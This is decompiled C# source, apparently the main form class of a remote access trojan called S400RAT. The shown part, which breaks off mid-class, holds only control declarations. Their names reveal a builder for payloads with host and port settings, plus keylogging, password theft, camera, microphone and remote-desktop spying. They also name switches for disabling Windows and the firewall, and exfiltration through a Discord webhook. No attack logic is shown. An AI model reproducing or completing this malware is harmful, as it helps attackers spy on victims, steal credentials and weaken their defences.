using System;
using System.CodeDom.Compiler;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Text;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Guna.UI2.WinForms;
using Guna.UI2.WinForms.Enums;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using S400RAT.My.Resources;
using SQLABC_ModernUI;
using WinMM;

namespace S400RAT;

[DesignerGenerated]
public class Form1 : Form
{
	public IContainer icontainer_0;

	[AccessedThroughProperty("ManagerToolStripMenuItem")]
	[CompilerGenerated]
	public ToolStripMenuItem toolStripMenuItem_0;

	[AccessedThroughProperty("RunFileToolStripMenuItem")]
	[CompilerGenerated]
	public ToolStripMenuItem toolStripMenuItem_1;

	[CompilerGenerated]
	[AccessedThroughProperty("FromLinkToolStripMenuItem")]
	public ToolStripMenuItem toolStripMenuItem_2;

	[AccessedThroughProperty("FromDiskToolStripMenuItem")]
	[CompilerGenerated]
	public ToolStripMenuItem toolStripMenuItem_3;

	[AccessedThroughProperty("ScriptToolStripMenuItem")]
	[CompilerGenerated]
	public ToolStripMenuItem toolStripMenuItem_4;

	[AccessedThroughProperty("RemoteDesktopToolStripMenuItem")]
	[CompilerGenerated]
	public ToolStripMenuItem toolStripMenuItem_5;

	[AccessedThroughProperty("MicrophoneToolStripMenuItem")]
	[CompilerGenerated]
	public ToolStripMenuItem toolStripMenuItem_6;

	[AccessedThroughProperty("GetPasswordsToolStripMenuItem")]
	[CompilerGenerated]
	public ToolStripMenuItem toolStripMenuItem_7;

	[AccessedThroughProperty("KeyloggerToolStripMenuItem")]
	[CompilerGenerated]
	public ToolStripMenuItem toolStripMenuItem_8;

	[CompilerGenerated]
	[AccessedThroughProperty("OpenChatToolStripMenuItem")]
	public ToolStripMenuItem toolStripMenuItem_9;

	[AccessedThroughProperty("ServerToolStripMenuItem")]
	[CompilerGenerated]
	public ToolStripMenuItem toolStripMenuItem_10;

	[CompilerGenerated]
	[AccessedThroughProperty("OpenFolderToolStripMenuItem")]
	public ToolStripMenuItem toolStripMenuItem_11;

	[AccessedThroughProperty("IMG2")]
	[CompilerGenerated]
	public ImageList imageList_0;

	[AccessedThroughProperty("NotifyIcon1")]
	[CompilerGenerated]
	public NotifyIcon notifyIcon_0;

	[CompilerGenerated]
	[AccessedThroughProperty("ContextMenuStrip2")]
	public ContextMenuStrip contextMenuStrip_0;

	[CompilerGenerated]
	[AccessedThroughProperty("RestartToolStripMenuItem1")]
	public ToolStripMenuItem toolStripMenuItem_12;

	[AccessedThroughProperty("ExitToolStripMenuItem")]
	[CompilerGenerated]
	public ToolStripMenuItem toolStripMenuItem_13;

	[CompilerGenerated]
	[AccessedThroughProperty("Timer1")]
	public System.Windows.Forms.Timer timer_0;

	[AccessedThroughProperty("Guna2AnimateWindow1")]
	[CompilerGenerated]
	public Guna2AnimateWindow guna2AnimateWindow_0;

	[CompilerGenerated]
	[AccessedThroughProperty("Guna2Elipse1")]
	public Guna2Elipse guna2Elipse_0;

	[AccessedThroughProperty("Guna2Elipse2")]
	[CompilerGenerated]
	public Guna2Elipse guna2Elipse_1;

	[CompilerGenerated]
	[AccessedThroughProperty("P1")]
	public Guna2Panel guna2Panel_0;

	[AccessedThroughProperty("panel8")]
	[CompilerGenerated]
	public Panel panel_0;

	[AccessedThroughProperty("Guna2ControlBox1")]
	[CompilerGenerated]
	public Guna2ControlBox guna2ControlBox_0;

	[AccessedThroughProperty("Panel6")]
	[CompilerGenerated]
	public Panel panel_1;

	[AccessedThroughProperty("panel9")]
	[CompilerGenerated]
	public Panel panel_2;

	[CompilerGenerated]
	[AccessedThroughProperty("label16")]
	public Label IdpsByboqX;

	[CompilerGenerated]
	[AccessedThroughProperty("Timer2")]
	public System.Windows.Forms.Timer timer_1;

	[AccessedThroughProperty("Guna2BorderlessForm1")]
	[CompilerGenerated]
	public Guna2BorderlessForm guna2BorderlessForm_0;

	[AccessedThroughProperty("FolderBrowserDialog1")]
	[CompilerGenerated]
	public FolderBrowserDialog folderBrowserDialog_0;

	[CompilerGenerated]
	[AccessedThroughProperty("TabControl1")]
	public TabControl tabControl_0;

	[AccessedThroughProperty("A")]
	[CompilerGenerated]
	public TabPage tabPage_0;

	[AccessedThroughProperty("B")]
	[CompilerGenerated]
	public TabPage tabPage_1;

	[AccessedThroughProperty("D")]
	[CompilerGenerated]
	public TabPage tabPage_2;

	[CompilerGenerated]
	[AccessedThroughProperty("panel1")]
	public Panel panel_3;

	[CompilerGenerated]
	[AccessedThroughProperty("Settings6")]
	public Button button_0;

	[CompilerGenerated]
	[AccessedThroughProperty("Toolbox5")]
	public Button button_1;

	[CompilerGenerated]
	[AccessedThroughProperty("About")]
	public Button button_2;

	[CompilerGenerated]
	[AccessedThroughProperty("Logis4")]
	public Button button_3;

	[CompilerGenerated]
	[AccessedThroughProperty("Builder3")]
	public Button button_4;

	[CompilerGenerated]
	[AccessedThroughProperty("Client2")]
	public Button button_5;

	[AccessedThroughProperty("Home1")]
	[CompilerGenerated]
	public Button button_6;

	[AccessedThroughProperty("panel2")]
	[CompilerGenerated]
	public Panel panel_4;

	[CompilerGenerated]
	[AccessedThroughProperty("pictureBox1")]
	public PictureBox pictureBox_0;

	[AccessedThroughProperty("Panel7")]
	[CompilerGenerated]
	public Panel panel_5;

	[CompilerGenerated]
	[AccessedThroughProperty("C")]
	public TabPage tabPage_3;

	[CompilerGenerated]
	[AccessedThroughProperty("D5")]
	public Guna2RadioButton guna2RadioButton_0;

	[AccessedThroughProperty("D1")]
	[CompilerGenerated]
	public Guna2RadioButton guna2RadioButton_1;

	[AccessedThroughProperty("Name_Folder")]
	[CompilerGenerated]
	public Guna2TextBox guna2TextBox_0;

	[AccessedThroughProperty("D7")]
	[CompilerGenerated]
	public Guna2RadioButton guna2RadioButton_2;

	[AccessedThroughProperty("D3")]
	[CompilerGenerated]
	public Guna2RadioButton guna2RadioButton_3;

	[AccessedThroughProperty("Name_Payload")]
	[CompilerGenerated]
	public Guna2TextBox guna2TextBox_1;

	[AccessedThroughProperty("Ports")]
	[CompilerGenerated]
	public Guna2TextBox guna2TextBox_2;

	[AccessedThroughProperty("NameClient")]
	[CompilerGenerated]
	public Guna2TextBox guna2TextBox_3;

	[AccessedThroughProperty("host")]
	[CompilerGenerated]
	public Guna2TextBox guna2TextBox_4;

	[AccessedThroughProperty("L1")]
	[CompilerGenerated]
	public L1 l1_0;

	[AccessedThroughProperty("Pp1")]
	[CompilerGenerated]
	public Pp1 pp1_0;

	[AccessedThroughProperty("IMAGELOG")]
	[CompilerGenerated]
	public ImageList imageList_1;

	[AccessedThroughProperty("Label26")]
	[CompilerGenerated]
	public Label label_0;

	[AccessedThroughProperty("Panel14")]
	[CompilerGenerated]
	public Panel panel_6;

	[AccessedThroughProperty("Label23")]
	[CompilerGenerated]
	public Label label_1;

	[CompilerGenerated]
	[AccessedThroughProperty("Guna2CircleProgressBar1")]
	public Guna2CircleProgressBar guna2CircleProgressBar_0;

	[AccessedThroughProperty("PictureBox6")]
	[CompilerGenerated]
	public PictureBox pictureBox_1;

	[AccessedThroughProperty("ListView1")]
	[CompilerGenerated]
	public ListView listView_0;

	[AccessedThroughProperty("ColumnHeader24")]
	[CompilerGenerated]
	public ColumnHeader columnHeader_0;

	[CompilerGenerated]
	[AccessedThroughProperty("ColumnHeader1")]
	public ColumnHeader columnHeader_1;

	[AccessedThroughProperty("ColumnHeader2")]
	[CompilerGenerated]
	public ColumnHeader columnHeader_2;

	[CompilerGenerated]
	[AccessedThroughProperty("ColumnHeader3")]
	public ColumnHeader columnHeader_3;

	[CompilerGenerated]
	[AccessedThroughProperty("ColumnHeader4")]
	public ColumnHeader columnHeader_4;

	[CompilerGenerated]
	[AccessedThroughProperty("ColumnHeader5")]
	public ColumnHeader columnHeader_5;

	[CompilerGenerated]
	[AccessedThroughProperty("ColumnHeader6")]
	public ColumnHeader columnHeader_6;

	[CompilerGenerated]
	[AccessedThroughProperty("ColumnHeader7")]
	public ColumnHeader columnHeader_7;

	[AccessedThroughProperty("ColumnHeader8")]
	[CompilerGenerated]
	public ColumnHeader columnHeader_8;

	[CompilerGenerated]
	[AccessedThroughProperty("ColumnHeader9")]
	public ColumnHeader columnHeader_9;

	[AccessedThroughProperty("ColumnHeader10")]
	[CompilerGenerated]
	public ColumnHeader columnHeader_10;

	[CompilerGenerated]
	[AccessedThroughProperty("ColumnHeader11")]
	public ColumnHeader columnHeader_11;

	[AccessedThroughProperty("ColumnHeader12")]
	[CompilerGenerated]
	public ColumnHeader columnHeader_12;

	[CompilerGenerated]
	[AccessedThroughProperty("ColumnHeader13")]
	public ColumnHeader columnHeader_13;

	[CompilerGenerated]
	[AccessedThroughProperty("ColumnHeader14")]
	public ColumnHeader columnHeader_14;

	[CompilerGenerated]
	[AccessedThroughProperty("ColumnHeader15")]
	public ColumnHeader xbiAelilYi;

	[AccessedThroughProperty("ColumnHeader16")]
	[CompilerGenerated]
	public ColumnHeader columnHeader_15;

	[CompilerGenerated]
	[AccessedThroughProperty("ColumnHeader17")]
	public ColumnHeader columnHeader_16;

	[CompilerGenerated]
	[AccessedThroughProperty("ColumnHeader18")]
	public ColumnHeader columnHeader_17;

	[AccessedThroughProperty("ColumnHeader19")]
	[CompilerGenerated]
	public ColumnHeader columnHeader_18;

	[CompilerGenerated]
	[AccessedThroughProperty("ColumnHeader20")]
	public ColumnHeader columnHeader_19;

	[CompilerGenerated]
	[AccessedThroughProperty("ColumnHeader21")]
	public ColumnHeader columnHeader_20;

	[AccessedThroughProperty("ColumnHeader22")]
	[CompilerGenerated]
	public ColumnHeader columnHeader_21;

	[AccessedThroughProperty("USER")]
	[CompilerGenerated]
	public ImageList imageList_2;

	[CompilerGenerated]
	[AccessedThroughProperty("Panel18")]
	public Panel panel_7;

	[CompilerGenerated]
	[AccessedThroughProperty("Label3")]
	public Guna2Button guna2Button_0;

	[CompilerGenerated]
	[AccessedThroughProperty("PictureBox10")]
	public PictureBox pictureBox_2;

	[AccessedThroughProperty("Label29")]
	[CompilerGenerated]
	public Label label_2;

	[CompilerGenerated]
	[AccessedThroughProperty("Panel17")]
	public Panel panel_8;

	[CompilerGenerated]
	[AccessedThroughProperty("Onl")]
	public Guna2Button guna2Button_1;

	[CompilerGenerated]
	[AccessedThroughProperty("PictureBox9")]
	public PictureBox pictureBox_3;

	[CompilerGenerated]
	[AccessedThroughProperty("Label20")]
	public Label label_3;

	[CompilerGenerated]
	[AccessedThroughProperty("Panel16")]
	public Panel panel_9;

	[CompilerGenerated]
	[AccessedThroughProperty("Sel")]
	public Guna2Button guna2Button_2;

	[AccessedThroughProperty("PictureBox7")]
	[CompilerGenerated]
	public PictureBox pictureBox_4;

	[AccessedThroughProperty("Panel19")]
	[CompilerGenerated]
	public Panel panel_10;

	[AccessedThroughProperty("UP")]
	[CompilerGenerated]
	public Guna2Button guna2Button_3;

	[AccessedThroughProperty("PictureBox11")]
	[CompilerGenerated]
	public PictureBox pictureBox_5;

	[CompilerGenerated]
	[AccessedThroughProperty("Label30")]
	public Label label_4;

	[AccessedThroughProperty("Panel20")]
	[CompilerGenerated]
	public Panel panel_11;

	[AccessedThroughProperty("Winxp")]
	[CompilerGenerated]
	public Guna2Button guna2Button_4;

	[AccessedThroughProperty("PictureBox12")]
	[CompilerGenerated]
	public PictureBox pictureBox_6;

	[CompilerGenerated]
	[AccessedThroughProperty("Label31")]
	public Label label_5;

	[CompilerGenerated]
	[AccessedThroughProperty("Panel21")]
	public Panel panel_12;

	[CompilerGenerated]
	[AccessedThroughProperty("Win10")]
	public Guna2Button guna2Button_5;

	[CompilerGenerated]
	[AccessedThroughProperty("PictureBox8")]
	public PictureBox pictureBox_7;

	[AccessedThroughProperty("Label27")]
	[CompilerGenerated]
	public Label label_6;

	[CompilerGenerated]
	[AccessedThroughProperty("Panel22")]
	public Panel panel_13;

	[CompilerGenerated]
	[AccessedThroughProperty("Win8")]
	public Guna2Button guna2Button_6;

	[CompilerGenerated]
	[AccessedThroughProperty("PictureBox13")]
	public PictureBox pictureBox_8;

	[CompilerGenerated]
	[AccessedThroughProperty("Label28")]
	public Label label_7;

	[CompilerGenerated]
	[AccessedThroughProperty("Panel15")]
	public Panel panel_14;

	[AccessedThroughProperty("Win7")]
	[CompilerGenerated]
	public Guna2Button guna2Button_7;

	[CompilerGenerated]
	[AccessedThroughProperty("PictureBox5")]
	public PictureBox pictureBox_9;

	[AccessedThroughProperty("Label25")]
	[CompilerGenerated]
	public Label label_8;

	[CompilerGenerated]
	[AccessedThroughProperty("Panel12")]
	public Panel panel_15;

	[AccessedThroughProperty("Guna2Button7")]
	[CompilerGenerated]
	public Guna2Button guna2Button_8;

	[AccessedThroughProperty("Label19")]
	[CompilerGenerated]
	public Label label_9;

	[AccessedThroughProperty("PictureBox16")]
	[CompilerGenerated]
	public PictureBox pictureBox_10;

	[AccessedThroughProperty("Panel10")]
	[CompilerGenerated]
	public Panel panel_16;

	[CompilerGenerated]
	[AccessedThroughProperty("SCANN")]
	public Guna2Button guna2Button_9;

	[CompilerGenerated]
	[AccessedThroughProperty("Label11")]
	public Label label_10;

	[CompilerGenerated]
	[AccessedThroughProperty("PictureBox14")]
	public PictureBox pictureBox_11;

	[AccessedThroughProperty("ColumnHeader23")]
	[CompilerGenerated]
	public ColumnHeader columnHeader_22;

	[AccessedThroughProperty("ColumnHeader25")]
	[CompilerGenerated]
	public ColumnHeader columnHeader_23;

	[AccessedThroughProperty("ColumnHeader28")]
	[CompilerGenerated]
	public ColumnHeader columnHeader_24;

	[CompilerGenerated]
	[AccessedThroughProperty("DesktopToolStripMenuItem")]
	public ToolStripMenuItem toolStripMenuItem_14;

	[CompilerGenerated]
	[AccessedThroughProperty("CameraToolStripMenuItem")]
	public ToolStripMenuItem opxXcnMiPX;

	[AccessedThroughProperty("VirusToolStripMenuItem")]
	[CompilerGenerated]
	public ToolStripMenuItem toolStripMenuItem_15;

	[AccessedThroughProperty("NgrokToolStripMenuItem")]
	[CompilerGenerated]
	public ToolStripMenuItem toolStripMenuItem_16;

	[AccessedThroughProperty("TextBox1")]
	[CompilerGenerated]
	public Guna2TextBox guna2TextBox_5;

	[AccessedThroughProperty("Label1")]
	[CompilerGenerated]
	public Label label_11;

	[CompilerGenerated]
	[AccessedThroughProperty("PictureBox19")]
	public PictureBox pictureBox_12;

	[AccessedThroughProperty("PictureBox21")]
	[CompilerGenerated]
	public PictureBox pictureBox_13;

	[CompilerGenerated]
	[AccessedThroughProperty("PictureBox22")]
	public PictureBox pictureBox_14;

	[CompilerGenerated]
	[AccessedThroughProperty("Label13")]
	public Label label_12;

	[AccessedThroughProperty("ProgressBar1")]
	[CompilerGenerated]
	public Guna2RadialGauge guna2RadialGauge_0;

	[AccessedThroughProperty("LinkLabel1")]
	[CompilerGenerated]
	public LinkLabel linkLabel_0;

	[CompilerGenerated]
	[AccessedThroughProperty("PictureBox20")]
	public PictureBox pictureBox_15;

	[CompilerGenerated]
	[AccessedThroughProperty("Label24")]
	public Label label_13;

	[CompilerGenerated]
	[AccessedThroughProperty("Label32")]
	public Label label_14;

	[CompilerGenerated]
	[AccessedThroughProperty("Label18")]
	public Label label_15;

	[CompilerGenerated]
	[AccessedThroughProperty("Label14")]
	public Label label_16;

	[AccessedThroughProperty("Label2")]
	[CompilerGenerated]
	public Label label_17;

	[AccessedThroughProperty("SRR")]
	[CompilerGenerated]
	public Label label_18;

	[CompilerGenerated]
	[AccessedThroughProperty("Ftime")]
	public Label label_19;

	[AccessedThroughProperty("Flevel")]
	[CompilerGenerated]
	public Label label_20;

	[AccessedThroughProperty("Fname")]
	[CompilerGenerated]
	public Label label_21;

	[CompilerGenerated]
	[AccessedThroughProperty("Panel13")]
	public Panel panel_17;

	[CompilerGenerated]
	[AccessedThroughProperty("CCC")]
	public Panel panel_18;

	[CompilerGenerated]
	[AccessedThroughProperty("Control")]
	public Guna2ContextMenuStrip guna2ContextMenuStrip_0;

	[CompilerGenerated]
	[AccessedThroughProperty("MyComputerToolStripMenuItem")]
	public ToolStripMenuItem toolStripMenuItem_17;

	[CompilerGenerated]
	[AccessedThroughProperty("ManagerToolStripMenuItem1")]
	public ToolStripMenuItem toolStripMenuItem_18;

	[CompilerGenerated]
	[AccessedThroughProperty("ContextMenuStrip1")]
	public ContextMenuStrip contextMenuStrip_1;

	[AccessedThroughProperty("ManagerToolStripMenuItem2")]
	[CompilerGenerated]
	public ToolStripMenuItem toolStripMenuItem_19;

	[CompilerGenerated]
	[AccessedThroughProperty("ControllToolStripMenuItem")]
	public ToolStripMenuItem toolStripMenuItem_20;

	[AccessedThroughProperty("InformationsToolStripMenuItem")]
	[CompilerGenerated]
	public ToolStripMenuItem toolStripMenuItem_21;

	[CompilerGenerated]
	[AccessedThroughProperty("InstallToolStripMenuItem")]
	public ToolStripMenuItem toolStripMenuItem_22;

	[AccessedThroughProperty("RevarseProxyToolStripMenuItem1")]
	[CompilerGenerated]
	public ToolStripMenuItem toolStripMenuItem_23;

	[AccessedThroughProperty("ToolStripMenuItem1")]
	[CompilerGenerated]
	public ToolStripMenuItem toolStripMenuItem_24;

	[CompilerGenerated]
	[AccessedThroughProperty("ToolStripMenuItem3")]
	public ToolStripMenuItem toolStripMenuItem_25;

	[CompilerGenerated]
	[AccessedThroughProperty("DisableWindowsToolStripMenuItem")]
	public ToolStripMenuItem toolStripMenuItem_26;

	[CompilerGenerated]
	[AccessedThroughProperty("ToolStripMenuItem4")]
	public ToolStripMenuItem toolStripMenuItem_27;

	[CompilerGenerated]
	[AccessedThroughProperty("ToolStripMenuItem5")]
	public ToolStripMenuItem toolStripMenuItem_28;

	[AccessedThroughProperty("ToolStripMenuItem6")]
	[CompilerGenerated]
	public ToolStripMenuItem toolStripMenuItem_29;

	[CompilerGenerated]
	[AccessedThroughProperty("ToolStripMenuItem7")]
	public ToolStripMenuItem toolStripMenuItem_30;

	[CompilerGenerated]
	[AccessedThroughProperty("ToolStripMenuItem8")]
	public ToolStripMenuItem toolStripMenuItem_31;

	[AccessedThroughProperty("ToolStripMenuItem9")]
	[CompilerGenerated]
	public ToolStripMenuItem toolStripMenuItem_32;

	[CompilerGenerated]
	[AccessedThroughProperty("ToolStripMenuItem2")]
	public ToolStripMenuItem toolStripMenuItem_33;

	[CompilerGenerated]
	[AccessedThroughProperty("ToolStripMenuItem10")]
	public ToolStripMenuItem toolStripMenuItem_34;

	[CompilerGenerated]
	[AccessedThroughProperty("ToolStripMenuItem14")]
	public ToolStripMenuItem toolStripMenuItem_35;

	[CompilerGenerated]
	[AccessedThroughProperty("ToolStripMenuItem18")]
	public ToolStripMenuItem toolStripMenuItem_36;

	[AccessedThroughProperty("Label8")]
	[CompilerGenerated]
	public Label label_22;

	[AccessedThroughProperty("D4")]
	[CompilerGenerated]
	public Guna2RadioButton guna2RadioButton_4;

	[AccessedThroughProperty("ToolStripMenuItem11")]
	[CompilerGenerated]
	public ToolStripMenuItem toolStripMenuItem_37;

	[CompilerGenerated]
	[AccessedThroughProperty("ToolStripMenuItem23")]
	public ToolStripMenuItem toolStripMenuItem_38;

	[AccessedThroughProperty("ToolStripMenuItem12")]
	[CompilerGenerated]
	public ToolStripMenuItem toolStripMenuItem_39;

	[AccessedThroughProperty("FunToolStripMenuItem1")]
	[CompilerGenerated]
	public ToolStripMenuItem toolStripMenuItem_40;

	[CompilerGenerated]
	[AccessedThroughProperty("ToolStripMenuItem13")]
	public ToolStripMenuItem toolStripMenuItem_41;

	[CompilerGenerated]
	[AccessedThroughProperty("ToolStripMenuItem22")]
	public ToolStripMenuItem toolStripMenuItem_42;

	[CompilerGenerated]
	[AccessedThroughProperty("ToolStripMenuItem24")]
	public ToolStripMenuItem toolStripMenuItem_43;

	[AccessedThroughProperty("SqlabC_ControlMini1")]
	[CompilerGenerated]
	public SQLABC_ControlMini sqlabc_ControlMini_0;

	[CompilerGenerated]
	[AccessedThroughProperty("Timer3")]
	public System.Windows.Forms.Timer timer_2;

	[CompilerGenerated]
	[AccessedThroughProperty("Panel33")]
	public Panel panel_19;

	[AccessedThroughProperty("Label12")]
	[CompilerGenerated]
	public Label label_23;

	[CompilerGenerated]
	[AccessedThroughProperty("USS")]
	public Guna2CircleProgressBar guna2CircleProgressBar_1;

	[CompilerGenerated]
	[AccessedThroughProperty("ListView2")]
	public ListView listView_1;

	[AccessedThroughProperty("ColumnHeader26")]
	[CompilerGenerated]
	public ColumnHeader columnHeader_25;

	[AccessedThroughProperty("ColumnHeader27")]
	[CompilerGenerated]
	public ColumnHeader columnHeader_26;

	[AccessedThroughProperty("ColumnHeader29")]
	[CompilerGenerated]
	public ColumnHeader columnHeader_27;

	[AccessedThroughProperty("ColumnHeader30")]
	[CompilerGenerated]
	public ColumnHeader columnHeader_28;

	[CompilerGenerated]
	[AccessedThroughProperty("ImageList1")]
	public ImageList imageList_3;

	[AccessedThroughProperty("NONN")]
	[CompilerGenerated]
	public Guna2Button guna2Button_10;

	[AccessedThroughProperty("Timer4")]
	[CompilerGenerated]
	public System.Windows.Forms.Timer timer_3;

	[CompilerGenerated]
	[AccessedThroughProperty("panel4")]
	public Panel panel_20;

	[AccessedThroughProperty("PLW")]
	[CompilerGenerated]
	public Guna2CircleProgressBar guna2CircleProgressBar_2;

	[CompilerGenerated]
	[AccessedThroughProperty("CO")]
	public Label label_24;

	[AccessedThroughProperty("label4")]
	[CompilerGenerated]
	public Label label_25;

	[AccessedThroughProperty("D8")]
	[CompilerGenerated]
	public Guna2RadioButton guna2RadioButton_5;

	[CompilerGenerated]
	[AccessedThroughProperty("Label43")]
	public Label label_26;

	[AccessedThroughProperty("Install_Payload")]
	[CompilerGenerated]
	public Guna2ToggleSwitch guna2ToggleSwitch_0;

	[AccessedThroughProperty("D2")]
	[CompilerGenerated]
	public Guna2RadioButton guna2RadioButton_6;

	[AccessedThroughProperty("D6")]
	[CompilerGenerated]
	public Guna2RadioButton guna2RadioButton_7;

	[AccessedThroughProperty("ShowToolStripMenuItem")]
	[CompilerGenerated]
	public ToolStripMenuItem toolStripMenuItem_44;

	[AccessedThroughProperty("ToolStripMenuItem16")]
	[CompilerGenerated]
	public ToolStripMenuItem toolStripMenuItem_45;

	[AccessedThroughProperty("ToolStripMenuItem17")]
	[CompilerGenerated]
	public ToolStripMenuItem toolStripMenuItem_46;

	[AccessedThroughProperty("ToolStripMenuItem20")]
	[CompilerGenerated]
	public ToolStripMenuItem toolStripMenuItem_47;

	[CompilerGenerated]
	[AccessedThroughProperty("ToolStripMenuItem21")]
	public ToolStripMenuItem toolStripMenuItem_48;

	[AccessedThroughProperty("ToolStripMenuItem25")]
	[CompilerGenerated]
	public ToolStripMenuItem toolStripMenuItem_49;

	[AccessedThroughProperty("ToolStripMenuItem15")]
	[CompilerGenerated]
	public ToolStripMenuItem toolStripMenuItem_50;

	[AccessedThroughProperty("TabControl2")]
	[CompilerGenerated]
	public TabControl tabControl_1;

	[AccessedThroughProperty("Connect1")]
	[CompilerGenerated]
	public TabPage tabPage_4;

	[AccessedThroughProperty("Install1")]
	[CompilerGenerated]
	public TabPage tabPage_5;

	[AccessedThroughProperty("Security1")]
	[CompilerGenerated]
	public TabPage tabPage_6;

	[CompilerGenerated]
	[AccessedThroughProperty("TabPage6")]
	public TabPage tabPage_7;

	[CompilerGenerated]
	[AccessedThroughProperty("Panel32")]
	public Panel panel_21;

	[AccessedThroughProperty("TabPage8")]
	[CompilerGenerated]
	public TabPage tabPage_8;

	[AccessedThroughProperty("TabPage9")]
	[CompilerGenerated]
	public TabPage tabPage_9;

	[AccessedThroughProperty("Panel23")]
	[CompilerGenerated]
	public Panel panel_22;

	[AccessedThroughProperty("TabPage3")]
	[CompilerGenerated]
	public TabPage tabPage_10;

	[AccessedThroughProperty("Panel31")]
	[CompilerGenerated]
	public Panel panel_23;

	[AccessedThroughProperty("Panel34")]
	[CompilerGenerated]
	public Panel panel_24;

	[AccessedThroughProperty("Panel24")]
	[CompilerGenerated]
	public Panel panel_25;

	[AccessedThroughProperty("Building")]
	[CompilerGenerated]
	public Guna2Button guna2Button_11;

	[AccessedThroughProperty("ZIS")]
	[CompilerGenerated]
	public Guna2ToggleSwitch guna2ToggleSwitch_1;

	[AccessedThroughProperty("Label55")]
	[CompilerGenerated]
	public Label label_27;

	[AccessedThroughProperty("Nu")]
	[CompilerGenerated]
	public NumericUpDown numericUpDown_0;

	[CompilerGenerated]
	[AccessedThroughProperty("Label6")]
	public Label label_28;

	[AccessedThroughProperty("GB")]
	[CompilerGenerated]
	public Guna2RadioButton guna2RadioButton_8;

	[AccessedThroughProperty("MB")]
	[CompilerGenerated]
	public Guna2RadioButton guna2RadioButton_9;

	[AccessedThroughProperty("KB")]
	[CompilerGenerated]
	public Guna2RadioButton guna2RadioButton_10;

	[CompilerGenerated]
	[AccessedThroughProperty("Guna2GradientPanel4")]
	public Guna2GradientPanel guna2GradientPanel_0;

	[AccessedThroughProperty("Button7")]
	[CompilerGenerated]
	public Button button_7;

	[AccessedThroughProperty("Button6")]
	[CompilerGenerated]
	public Button button_8;

	[CompilerGenerated]
	[AccessedThroughProperty("Button5")]
	public Button button_9;

	[AccessedThroughProperty("Button4")]
	[CompilerGenerated]
	public Button button_10;

	[CompilerGenerated]
	[AccessedThroughProperty("Button3")]
	public Button button_11;

	[CompilerGenerated]
	[AccessedThroughProperty("Button2")]
	public Button button_12;

	[CompilerGenerated]
	[AccessedThroughProperty("Button1")]
	public Button button_13;

	[AccessedThroughProperty("Guna2GradientPanel3")]
	[CompilerGenerated]
	public Guna2GradientPanel guna2GradientPanel_1;

	[CompilerGenerated]
	[AccessedThroughProperty("Guna2GradientPanel2")]
	public Guna2GradientPanel guna2GradientPanel_2;

	[AccessedThroughProperty("Guna2GradientPanel1")]
	[CompilerGenerated]
	public Guna2GradientPanel guna2GradientPanel_3;

	[AccessedThroughProperty("Guna2GradientPanel7")]
	[CompilerGenerated]
	public Guna2GradientPanel vRcYfnFcaE;

	[AccessedThroughProperty("Rndm")]
	[CompilerGenerated]
	public Guna2TextBox guna2TextBox_6;

	[AccessedThroughProperty("PictureBox35")]
	[CompilerGenerated]
	public PictureBox pictureBox_16;

	[AccessedThroughProperty("Add_Firewall")]
	[CompilerGenerated]
	public Guna2ToggleSwitch guna2ToggleSwitch_2;

	[CompilerGenerated]
	[AccessedThroughProperty("PictureBox37")]
	public PictureBox pictureBox_17;

	[CompilerGenerated]
	[AccessedThroughProperty("TurnOff_Firewall")]
	public Guna2ToggleSwitch guna2ToggleSwitch_3;

	[CompilerGenerated]
	[AccessedThroughProperty("Label54")]
	public Label label_29;

	[AccessedThroughProperty("Guna2DragControl1")]
	[CompilerGenerated]
	public Guna2DragControl guna2DragControl_0;

	[AccessedThroughProperty("Guna2GradientPanel5")]
	[CompilerGenerated]
	public Guna2GradientPanel guna2GradientPanel_4;

	[AccessedThroughProperty("Pastebin")]
	[CompilerGenerated]
	public RadioButton radioButton_0;

	[AccessedThroughProperty("IPDNS")]
	[CompilerGenerated]
	public RadioButton radioButton_1;

	[AccessedThroughProperty("Add_Socket")]
	[CompilerGenerated]
	public Guna2GradientButton guna2GradientButton_0;

	[AccessedThroughProperty("PictureBox33")]
	[CompilerGenerated]
	public PictureBox pictureBox_18;

	[CompilerGenerated]
	[AccessedThroughProperty("Label22")]
	public Label label_30;

	[AccessedThroughProperty("PictureBox15")]
	[CompilerGenerated]
	public PictureBox pictureBox_19;

	[AccessedThroughProperty("Label46")]
	[CompilerGenerated]
	public Label label_31;

	[CompilerGenerated]
	[AccessedThroughProperty("Num_Delay")]
	public Guna2TextBox hmlYtAapSQ;

	[CompilerGenerated]
	[AccessedThroughProperty("Discord_URL")]
	public Guna2TextBox guna2TextBox_7;

	[CompilerGenerated]
	[AccessedThroughProperty("PictureBox30")]
	public PictureBox pictureBox_20;

	[CompilerGenerated]
	[AccessedThroughProperty("Label45")]
	public Label label_32;

	[AccessedThroughProperty("Discord")]
	[CompilerGenerated]
	public Guna2ToggleSwitch guna2ToggleSwitch_4;

	[CompilerGenerated]
	[AccessedThroughProperty("PictureBox32")]
	public PictureBox pictureBox_21;

	[CompilerGenerated]
	[AccessedThroughProperty("Label47")]
	public Label label_33;

	[AccessedThroughProperty("PictureBox34")]
	[CompilerGenerated]
	public PictureBox pictureBox_22;

	[AccessedThroughProperty("Delay")]
	[CompilerGenerated]
	public Guna2ToggleSwitch guna2ToggleSwitch_5;

	[AccessedThroughProperty("Encrypt_ifo")]
	[CompilerGenerated]
	public Guna2ToggleSwitch guna2ToggleSwitch_6;

	[AccessedThroughProperty("Label48")]
	[CompilerGenerated]
	public Label label_34;

	[CompilerGenerated]
	[AccessedThroughProperty("Label52")]
	public Label label_35;

	[CompilerGenerated]
	[AccessedThroughProperty("PictureBox23")]
	public PictureBox pictureBox_23;

	[CompilerGenerated]
	[AccessedThroughProperty("ColumnHeader34")]
	public ColumnHeader columnHeader_29;

	[CompilerGenerated]
	[AccessedThroughProperty("ColumnHeader35")]
	public ColumnHeader columnHeader_30;

	[AccessedThroughProperty("ColumnHeader36")]
	[CompilerGenerated]
	public ColumnHeader columnHeader_31;

	[CompilerGenerated]
	[AccessedThroughProperty("ListView_Socket")]
	public ListView listView_2;

	[AccessedThroughProperty("Guna2AnimateWindow2")]
	[CompilerGenerated]
	public Guna2AnimateWindow guna2AnimateWindow_1;

	[AccessedThroughProperty("Guna2GradientPanel9")]
	[CompilerGenerated]
	public Guna2GradientPanel guna2GradientPanel_5;

